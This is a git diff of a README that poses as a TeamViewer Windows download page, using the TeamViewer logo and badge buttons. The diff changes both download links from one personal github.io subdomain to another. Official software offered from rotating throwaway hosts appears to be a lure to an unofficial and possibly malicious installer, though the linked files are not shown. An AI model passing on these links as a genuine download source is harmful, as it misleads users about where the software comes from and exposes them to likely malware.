@@ -3,7 +3,7 @@
 
 <img src="https://teamviewer.scene7.com/is/image/teamviewergmbh/9EU29DEK0IRA-image?dpr=off" alt="TeamViewer Logo" width="760">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/TeamViewer-Desktop-Access)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cmetankadd.github.io/.github/TeamViewer-Desktop-Access)
 
 ---
 
@@ -19,7 +19,7 @@ The application offers encrypted remote sessions, unattended access, multi-monit
 
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6qRsYuiWrMj3FOUXZ5L7wMIPHt-RFqKsQkeUkWptfrg&s=10" width="900">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/TeamViewer-Desktop-Access)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cmetankadd.github.io/.github/TeamViewer-Desktop-Access)
 
 ---
 
